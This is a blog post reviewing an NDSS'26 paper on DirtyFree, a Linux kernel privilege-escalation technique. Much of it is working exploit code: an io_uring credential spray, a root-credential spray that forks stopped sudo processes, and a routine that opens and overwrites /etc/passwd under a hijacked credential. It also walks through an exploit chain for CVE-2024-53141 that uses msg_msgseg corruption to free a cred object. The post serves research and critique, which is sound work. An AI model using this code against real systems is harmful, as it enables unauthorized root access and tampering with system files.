---
title: "[NDSS'26] DirtyFree: Simplified Data-Oriented Programming in the Linux Kernel"
pubDate: 2026-03-12
description: "DirtyFree proposes a novel Data-Oriented Programming attack that achieves privilege escalation from a single partial-overwrite primitive, bypassing SLAB_VIRTUAL mitigations."
authors: [nova]
lang: en
---

> https://www.ndss-symposium.org/ndss-paper/dirtyfree-simplified-data-oriented-programming-in-the-linux-kernel/

This paper proposes a novel attack technique that converts a partial-overwrite primitive into privilege escalation using a single primitive, while also bypassing `SLAB_VIRTUAL` (not merged into mainline; used in [kCTF mitigation bypass](https://google.github.io/security-research/kernelctf/rules.html#2-mitigation-bypass-on-the-mitigation-instance); the [RFC](https://lore.kernel.org/lkml/20230915105933.495735-9-matteorizzo@google.com/#r) hasn't been updated in two or three years, so it probably won't land), a mitigation designed to prevent Temporal CrossCache Attacks.



## Proof of Concept

### Threat Model

Similar to kernels used in most upstream Linux distributions: KASLR, SMEP, SMAP, KPTI are enabled, with KCFI and SLAB_VIRTUAL enabled on top.



A vulnerable driver is available that can allocate up to 5 notes. Notes are readable, writable, allocatable, and freeable, but pointers are not cleared after free — resulting in a UAF vulnerability.

```c
#define MAX_SIZE 0x1000
#define MAX_NOTES 5

struct vuln_request {
    unsigned long long size; // Less than 0x1000
    unsigned long long addr;
    unsigned long long idx;  // Note index (0-4)
    char __user *data;
};

struct note {
    size_t size;
    char *data;
};

static long device_ioctl(struct file *file, unsigned int cmd, unsigned long arg)
{
    struct vuln_request __user *req = (struct vuln_request __user *)arg;

    switch (cmd) {
    case VULN_ALLOC:
        return handle_alloc(req);
    case VULN_FREE:
        return handle_free(req);
    case VULN_READ:
        return handle_read(req);
    case VULN_WRITE:
        return handle_write(req);
    default:
        return -ENOTTY;
    }
}
```

### Overview

![Overview of DirtyFree](https://cdn.nova.gal/img/image-20260312134727448.png)

In the PoC, the attack is somewhat simplified but still follows the diagram above overall.

1. Heap spray User Cred
2. Partially overwrite a pointer to make it point to one of the User Creds
3. Use the Arbitrary Free primitive to free the User Cred, creating a Cred UAF
4. Heap spray Root Cred so the freed User Cred slot gets overwritten with Root Cred
5. Privilege escalation



It's intuitive why this works: dangerous structures like `cred` are allocated in dedicated caches such as `cred_jar`, making UAF difficult to achieve directly. Other DOP techniques therefore resort to lower-level methods like CrossCache to bypass this. DirtyFree instead leverages an Arbitrary Free primitive to free and reuse the `cred` directly, simplifying the exploit chain and achieving relatively high reliability thanks to the isolation provided by the dedicated cache. According to the paper, the authors achieved close to 96% success rate in an idle system — though I personally couldn't replicate that.

> We observe that DIRTYFREE achieves a success rate of 95.6% in the idle state and 87.4% in the busy state.

Let's walk through each step.

### 1. User cred spray

To predict the location of User Cred as precisely as possible, we should spray as many `cred` structures as possible. However, more spray means more noise, which means less predictable memory layout. For example, `fork()` can produce `cred` structures, but it can't spray "a lot" (limited by process count) nor in a "controlled" manner (it also allocates various other structures like `task_struct`, polluting the heap layout). The authors use the `IO_URING` family of syscalls — specifically, calling `capset()` via `IORING_REGISTER_PERSONALITY` causes the kernel to allocate a new `cred` object by copying the current credentials, without producing any unrelated objects. Afterward, calling `io_uring_register()` with the same flags increments their reference count, preventing them from being freed. This approach reliably produces an extremely dense heap spray consisting entirely of `cred` structures.

```c
int app_setup_uring(struct submitter *s, unsigned int entries)
{
    struct app_io_sq_ring *sring = &s->sq_ring;
    struct app_io_cq_ring *cring = &s->cq_ring;
    struct io_uring_params p;
    void *sq_ptr, *cq_ptr;

    memset(&p, 0, sizeof(p));
    p.wq_fd = -1;

    s->ring_fd = io_uring_setup(entries, &p);
    if (s->ring_fd < 0) {
        perror("io_uring_setup");
        return 1;
    }

    /* Calculate ring buffer sizes */
    int sring_sz = p.sq_off.array + p.sq_entries * sizeof(unsigned);
    int cring_sz = p.cq_off.cqes + p.cq_entries * sizeof(struct io_uring_cqe);

    /* Check if single mmap is supported (kernel 5.4+) */
    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        if (cring_sz > sring_sz) {
            sring_sz = cring_sz;
        }
        cring_sz = sring_sz;
    }

    /* Map submission queue ring buffer */
    sq_ptr = mmap(0, sring_sz, PROT_READ | PROT_WRITE,
                  MAP_SHARED | MAP_POPULATE, s->ring_fd, IORING_OFF_SQ_RING);
    if (sq_ptr == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    /* Map completion queue ring buffer */
    if (p.features & IORING_FEAT_SINGLE_MMAP) {
        cq_ptr = sq_ptr;
    } else {
        cq_ptr = mmap(0, cring_sz, PROT_READ | PROT_WRITE,
                      MAP_SHARED | MAP_POPULATE, s->ring_fd, IORING_OFF_CQ_RING);
        if (cq_ptr == MAP_FAILED) {
            perror("mmap");
            return 1;
        }
    }

    /* Initialize submission queue ring structure */
    sring->head = sq_ptr + p.sq_off.head;
    sring->tail = sq_ptr + p.sq_off.tail;
    sring->ring_mask = sq_ptr + p.sq_off.ring_mask;
    sring->ring_entries = sq_ptr + p.sq_off.ring_entries;
    sring->flags = sq_ptr + p.sq_off.flags;
    sring->array = sq_ptr + p.sq_off.array;

    /* Initialize completion queue ring structure */
    cring->head = cq_ptr + p.cq_off.head;
    cring->tail = cq_ptr + p.cq_off.tail;
    cring->ring_mask = cq_ptr + p.cq_off.ring_mask;
    cring->ring_entries = cq_ptr + p.cq_off.ring_entries;
    cring->cqes = cq_ptr + p.cq_off.cqes;

    /* Map submission queue entries array */
    s->sqes = mmap(0, p.sq_entries * sizeof(struct io_uring_sqe),
                   PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE,
                   s->ring_fd, IORING_OFF_SQES);
    if (s->sqes == MAP_FAILED) {
        perror("mmap");
        return 1;
    }

    return 0;
}

void alloc_n_creds(int uring_fd, size_t n_creds)
{
    for (size_t i = 0; i < n_creds; i++) {
        struct __user_cap_header_struct cap_hdr = {
            .pid = 0,
            .version = _LINUX_CAPABILITY_VERSION_3
        };

        struct user_cap_data_struct cap_data[2] = {
            {.effective = 0, .inheritable = 0, .permitted = 0},
            {.effective = 0, .inheritable = 0, .permitted = 0}
        };

        /* Allocate new credential */
        if (syscall(SYS_capset, &cap_hdr, (void *)cap_data))
            fatal("capset() failed");

        /* Register with io_uring to increment refcount */
        if (syscall(SYS_io_uring_register, uring_fd,
                    IORING_REGISTER_PERSONALITY, 0, 0) < 0)
            fatal("io_uring_register() failed");
    }
}

void spray_user_creds(struct submitter *uring_cred)
{
    printf("[*] Setting up io_uring for credential spray...\n");
    app_setup_uring(uring_cred, 0x80);

    printf("[*] Spraying user credentials into kernel heap...\n");
    alloc_n_creds(uring_cred->ring_fd, 0xffff);

    printf("[+] User credential spray complete\n");
}
```

In this example, 0xffff `cred` structures of size 0xc0 are allocated, occupying 12 MB of memory, giving us an extremely predictable heap layout.



### 2. Partial pointer overwrite

Not much to detail here.

If partial overwrite is possible without a leak, just find a target with a high hit probability and flip the low bits.

If not, leak a heap address first, then overwrite accordingly.



### 3. Arbitrary Free

In the PoC, this capability is provided by the vulnerable driver itself. In the DirtyFree paper, the authors catalog structures that can enable this primitive, covering all general caches except `kmalloc-8` — meaning any vulnerable driver using those caches can leverage them for arbitrary free.



### 4. Root cred spray

Nothing novel here either. Use a SUID binary and `fork`.

The author stops the child processes to prevent the credentials from being freed.

```c
void spray_root_creds(void)
{
    printf("[*] Spraying root credentials via sudo processes...\n");

    for (int i = 0; i < 2048; i++) {
        int pid = fork();
        if (!pid) {
            /* Child process: exec sudo */
            execve("/usr/bin/sudo", (char *[]){"/usr/bin/sudo", NULL}, NULL);
            perror("execve sudo");
            exit(-1);
        } else if (pid > 0) {
            /* Parent process: stop child to keep credentials allocated */
            usleep(1500);
            kill(pid, SIGSTOP);
        } else {
            perror("fork");
            exit(-1);
        }
    }

    printf("[+] Root credential spray complete\n");
}
```



### 5. Privilege Escalation

Since we sprayed 65536 `cred` structures, we have no way to know which specific one was overwritten, so directly spawning a shell is impractical.

The general approach is to use `open()` to open and write to a privileged file such as `/etc/passwd`.

Of course, we still need to use the IO_URING operations here.

```c
int submit_to_sq(struct submitter *s, struct io_uring_sqe *sqes,
                 unsigned int sqe_len, unsigned int min_complete)
{
    struct app_io_sq_ring *sring = &s->sq_ring;
    unsigned index, head, tail, next_tail, mask, to_submit;

    next_tail = tail = *sring->tail;

    /* Add entries to submission queue */
    for (to_submit = 0; to_submit < sqe_len; to_submit++) {
        read_barrier();
        head = *sring->head;
        mask = *s->sq_ring.ring_mask;

        /* Check if queue is full */
        if ((head & mask) == (tail & mask) && head != tail) {
            break;
        }

        next_tail++;
        index = tail & mask;
        struct io_uring_sqe *sqe = &s->sqes[index];
        memcpy(sqe, &sqes[to_submit], sizeof(*sqe));
        sring->array[index] = index;
        tail = next_tail;
    }

    /* Update tail pointer */
    if (*sring->tail != tail) {
        *sring->tail = tail;
        write_barrier();
    }

    /* Submit to kernel */
    int ret = io_uring_enter(s->ring_fd, to_submit, min_complete,
                             IORING_ENTER_GETEVENTS);
    if (ret < 0) {
        perror("io_uring_enter");
        return ret;
    }

    return to_submit;
}


int read_from_cq(struct submitter *s, bool print, int *reaped_success,
                 int *results)
{
    struct app_io_cq_ring *cring = &s->cq_ring;
    struct io_uring_cqe *cqe;
    unsigned head, reaped = 0, success = 0;

    head = *cring->head;

    do {
        read_barrier();

        /* Check if queue is empty */
        if (head == *cring->tail)
            break;

        /* Get completion entry */
        cqe = &cring->cqes[head & *s->cq_ring.ring_mask];

        if (print) {
            if (cqe->res < 0) {
                printf("    [CQE] res=%d (error: %s), user_data=0x%llx\n",
                       cqe->res, strerror(abs(cqe->res)), cqe->user_data);
            } else {
                printf("    [CQE] res=%d, user_data=0x%llx\n",
                       cqe->res, cqe->user_data);
            }
        }

        if (cqe->res >= 0) {
            success++;
            if (results) {
                *results++ = cqe->res;
            }
        }

        head++;
        reaped++;
    } while (1);

    *cring->head = head;
    write_barrier();

    if (reaped_success != NULL) {
        *reaped_success = success;
    }

    return reaped;
}

void overwrite_passwd(struct submitter *uring_cred, int root_fd, const char *fake_passwd)
{
    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));

    /* Prepare OPENAT operation for /etc/passwd */
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = root_fd;
    sqe.addr = (__u64)"etc/passwd";
    sqe.open_flags = O_RDWR;
    sqe.len = 0;
    sqe.file_index = 0;

    printf("[*] Scanning through credentials to find root cred...\n");

    int reaped_success = 0, reap_cnt = 0, flag_fd;

    /* Try each personality until we find one that can open /etc/passwd */
    for (int i = 0; i < 0xffff && !reaped_success; i++) {
        reap_cnt++;
        sqe.personality = i + 1;
        submit_to_sq(uring_cred, &sqe, 1, 1);
        read_from_cq(uring_cred, false, &reaped_success, &flag_fd);
    }

    if (!reaped_success) {
        fatal("[!] Failed to open /etc/passwd (root cred not found)");
    }

    printf("[+] Successfully opened /etc/passwd with cred 0x%x, fd: %d\n", reap_cnt, flag_fd);

    /* Write fake passwd entry */
    write(flag_fd, fake_passwd, strlen(fake_passwd));

    printf("[+] /etc/passwd overwritten with root entry!\n");
}
```

### Debugging Notes

Quick reference for debugging:

```bash
gdb-gef --ex "target remote :1234" --ex "ksymaddr-remote-apply" --ex "kmod-load ToyExample ToyExample.ko" --ex "b prepare_creds" --ex "b ToyExample.c:224" --ex "b ToyExample.c:152"
```

```bash
gef> p/x *(struct cred *)$1
gef> slub-dump kmalloc-192 -vv
gef> b __x64_sys_io_uring_enter
gef> slab-contains 0xffff9ce542b6d180
```



## Arbitrary Free Object

To satisfy AFO, there are two key requirements:
1. There is a `ptr` pointing into the heap area, and there is a way to `kfree()` it (not `kmem_cache_free()`, since that inspects metadata and blows up if it doesn't match).
2. It can be allocated and freed by a low-privileged user.

On top of that, a sufficiently long window between allocation and free can significantly improve exploitability.

When hunting for AFO, the authors mainly tracked all `kfree()` variants and checked whether they could be triggered from userspace.

For each candidate, they checked whether the `ptr` is a local variable with a `kmalloc` in the same context — such temporary vars are dropped, since the window isn't long enough. After that, they continued with backward data-flow tracking and ultimately selected objects that don't live in the stack or global memory region.

> Put plainly, they look for the kind of `Obj->ptr` where `Obj` is allocated in the heap area, and both allocation and free are reachable through controllable calls.

Then they filter further: drop `Obj`s in dedicated caches, drop temporary `Obj`s, and finally drop privileged calls — what's left is usable.

> Actually, temporary `Obj`s aren't entirely unusable: if there's a `copy_to_user()` during allocation and deallocation, you can use something like FUSE to stretch the time window. The authors didn't filter those out.

In the end this covers objects across basically every size cache ~~the `msg_msg` concept reigns supreme as always~~
![image](https://cdn.nova.gal/img/vscode_picgo_1780485557983.png)

## Case Study

I haven't touched this in over two months. Back when I read it I still had plenty of doubts 🤔, but I can't recall them now. Rethinking it today:
1. Roughly, the publicly disclosed cases can all be exploited in multiple ways; the one case that nothing else can hit but DirtyFree can isn't disclosed.
2. They all require read + write primitives to leak and to overwrite the pointer, yet the paper claims it only needs a single Arbitrary Free primitive. (However you spin it, that's just how primitives are defined — if I insist your leak is part of the primitive too, there's nothing you can do about it.)
3. It supposedly needs neither AAW nor AAR, but it actually uses a fixed offset to compute the location of `cred`. On my machine at least it doesn't work, so reliability is hard to say.

### Analyze

In short, let's look at CVE-2024-53141, an out-of-bounds vulnerability. In `net/netfilter/ipset/ip_set_bitmap_ip.c` there's an operation that uses `bitmap:ip` to represent an IP range as a bitmap.

> I debugged this before but have forgotten the details — just read the AI explanation.

```c
/* Type structure */
struct bitmap_ip {
	unsigned long *members;	/* the set members */
	u32 first_ip;		/* host byte order, included in range */
	u32 last_ip;		/* host byte order, included in range */
	u32 elements;		/* number of max elements in the set */
	u32 hosts;		/* number of hosts in a subnet */
	size_t memsize;		/* members size */
	u8 netmask;		/* subnet netmask */
	struct timer_list gc;	/* garbage collection */
	struct ip_set *set;	/* attached to this ip_set */
	unsigned char extensions[]	/* data extensions */
		__aligned(__alignof__(u64));
};

/* ADT structure for generic function args */
struct bitmap_ip_adt_elem {
	u16 id;
};
```

In the function `bitmap_ip_uadt`, after the CIDR step `ip` gets rewritten, but it is never re-checked against `ip >= map->first_ip`, so `ip_to_id` ends up processing addresses below `map->first_ip`.

```c
// ① First bounds check: uses the original ip
if (ip < map->first_ip || ip > map->last_ip)
    return -IPSET_ERR_BITMAP_RANGE;
// ip = 0xFFFFFFFF, first_ip = 0xFFFFFFCB → check passes ✓

// ② CIDR mask: ip is rewritten to the network address (a completely different value!)
} else if (tb[IPSET_ATTR_CIDR]) {
    u8 cidr = nla_get_u8(tb[IPSET_ATTR_CIDR]);
    ip_set_mask_from_to(ip, ip_to, cidr);
    // CIDR=3: ip = 0xFFFFFFFF & 0xE0000000 = 0xE0000000
    //         ip_to = 0xFFFFFFFF
}

// ③ Only ip_to's upper bound is checked; ip's lower bound is never re-checked
if (ip_to > map->last_ip)
    return -IPSET_ERR_BITMAP_RANGE;
// 0xFFFFFFFF > 0xFFFFFFFF → FALSE → passes ✓

// ④ The loop starts from ip=0xE0000000, with no ip >= first_ip constraint!
for (; !before(ip_to, ip); ip += map->hosts) {
    e.id = ip_to_id(map, ip);   // ← OOB happens here
    ret = adtfn(set, &e, &ext, &ext, flags);
    ...
}
```

Inside `ip_to_id`:
```
static u32 ip_to_id(const struct bitmap_ip *m, u32 ip)
{
    return ((ip & ip_set_hostmask(m->netmask)) - m->first_ip) / m->hosts;
}
```

When ip = 0xE0000000, first_ip = 0xFFFFFFCB, netmask = 32, hosts = 1:


id (u32) = 0xE0000000 - 0xFFFFFFCB = 0xE0000035   (unsigned underflow wraparound)

When stored back into `bitmap_ip_adt_elem`, the id gets truncated:
id (u16) = 0x0035 = 53.

The map is allocated as `map = ip_set_alloc(sizeof(*map) + elements * set->dsize);`, i.e. `[0, elements-1]`, which here is exactly `[0, 0x34]` — so there's one slot we can write out of bounds.

### Exploit
The exploit has three stages; the full flow:


Stage 1: OOB read → leak heap address
Stage 2: OOB write → construct arbitrary free
Stage 3: DirtyFree → cross-cache free + root cred replacement


#### Heap Leak

Target cache: kmalloc-cg-512

Craft a `bitmap:ip` map whose size lands precisely in kmalloc-cg-512:

```c
size = sizeof(struct bitmap_ip) + 0x35 × dsize_comment
     = 0x58 + 0x35 × 0x8 = 0x200  →  kmalloc-cg-512 ✓
```

Heap layout preparation:


`[msg_msgseg] [msg_msgseg] ... [bitmap:ip map] [msg_msgseg] [msg_msgseg] ...`
                                    
OOB write (with the COMMENT extension flag):


```c
map->extensions[0x35] = get_ext(map, id=0x35)
                       ↕
start of adjacent msg_msgseg
```

The COMMENT extension writes a kernel heap pointer to the comment string buffer into the ext region. That pointer gets written into the data region of the adjacent msg_msgseg, and later, when reading the message back via `msgrcv`, scanning for values matching the `0xffff...` pattern yields a kernel heap address:

```c
// Leak scan
for(int j = 0; j < MSG_SIZE; j += 8) {
    if((msg.mtext[j] & 0xffff000000000000) == 0xffff000000000000) {
        heap_leak_addr = msg.mtext[j];
        break;
    }
}

// Derive cred location from the leaked address (relies on a fixed offset)
cred_addr = (heap_leak_addr & 0xfffffffffff00000) | 0x68e40;
```

#### OOB
Target cache: kmalloc-cg-2048

Craft a larger `bitmap:ip` map:

```c
size = sizeof(struct bitmap_ip) + 0x7a × dsize_counter
     = 0x58 + 0x7a × 0x10 = 0x7F8  →  kmalloc-cg-2048 (slot 0x800)
```
Again, spray msg_msgseg in adjacent positions (this time the msg_msgseg also lands in kmalloc-cg-2048).

OOB write (with the COUNTER extension flag):

The COUNTER extension stores bytes/packets counters in the ext region, written directly as 64-bit values. The attacker passes `cred_addr` as the counter value:

```c
// Trigger the OOB write
mnl_attr_put_u64(nlh, IPSET_ATTR_BYTES | NLA_F_NET_BYTEORDER,
                 bswap_64(cred_addr));    // ← write the cred address
mnl_attr_put_u64(nlh, IPSET_ATTR_PACKETS | NLA_F_NET_BYTEORDER,
                 bswap_64(cred_addr));
```

When `e->id = 0x7A`, the OOB write hits the start of the next slot:

```
bitmap:ip map (0x7F8 bytes)
+---+---+---+...+---+  ← end of map allocation (slot 0x800 has 0x8 bytes left)
                    ↓OOB (+0 bytes, start of next slot)
```
adjacent msg_msgseg->next = cred_addr   ← overwritten!
msg_msgseg struct:

```
struct msg_msgseg {
    struct msg_msgseg *next;  // offset 0 ← written to cred_addr here
    char data[];
};
```

#### DirtyFree
Trigger the arbitrary free:

```c
msgctl(msqid[i], IPC_RMID, NULL);
// → freeque()
// → free_msg()
// → kfree(msg_msgseg->next)   ← msg_msgseg->next == cred_addr
// → kfree(cred_addr)          ← frees the cred object!
```

This is a cross-cache free: `free_msg` calls `kfree(cred_addr)` in the kmalloc-cg-2048 context, while the cred object belongs to the kmalloc-192 cache.

```c
kmalloc-192 freelist:  ... → [cred_addr] → ...
                                  ↑
                           cred object spliced into the freelist
```
The kernel triggers an oops at this point (as `free_msg` keeps walking the list, it dereferences `cred->usage = 1` as a pointer), but the child processes are already in position before that:

```c
Child process (io_uring personality holds a reference to the user cred)
  ↓ msgctl triggers kfree(cred_addr)
  ↓ fork a swarm of sudo processes → root cred allocated, landing in the freed slot
  ↓ io_uring personality still points to cred_addr
  ↓ io_uring OPENAT with personality → executes with root cred
  ↓ write /etc/passwd → get a root shell
```

### Overview
```c
create_ip_set (kmalloc-cg-512, elements=0x35, WITH_COMMENT)
│
├─ spray msg_msgseg (kmalloc-cg-512, adjacent fill)
│
├─ trigger_oob_leak (ip=0xFFFFFFFF, CIDR=3)
│    ip_to_id(0xE0000000) = 0xE0000035 → u16 truncate → 0x0035
│    OOB write: extensions[0x35] = comment ptr → overwrites adjacent msg_msgseg data
│    msgrcv reads out the leaked address → compute cred_addr
│
create_ip_set (kmalloc-cg-2048, elements=0x7a, WITH_COUNTERS)
│
├─ spray msg_msgseg (kmalloc-cg-2048, adjacent fill)
│
├─ trigger_oob_write (ip=0xFFFFFFFF, CIDR=3, bytes/packets=cred_addr)
│    ip_to_id(0xE0000000) = 0xE0000035 → ... → 0x7A (different set parameters)
│    OOB write: extensions[0x7A] = cred_addr → overwrites adjacent msg_msgseg->next
│
├─ msgctl(IPC_RMID) → free_msg() → kfree(cred_addr)  [cross-cache free]
│
└─ root cred spray → occupy the freed cred slot → root shell
```

## Comments

Arbitrary Free isn't really a particularly novel exploitation technique, but this paper analyzes it fairly systematically and provides a relatively easy-to-use workflow, offering another option for everyday kernel exploitation. That said, I personally find its reliability not that high — there's no way it reaches the 95+% idle success rate the paper claims; it's barely usable at best. The key innovation is probably the ability to do cross-cache free, which is a step up from DirtyCred.

Beyond that, in terms of paper writing — offensive papers all seem to be written this way: lift an exploitation technique from kCTF, give it a name, hit a few real cases, do a comparison, systematically analyze the primitive, and finally throw in a defense. Same old formula.

> btw the io_uring cred spray setup also feels like it's straight out of DirtyCred. Nice mashup.
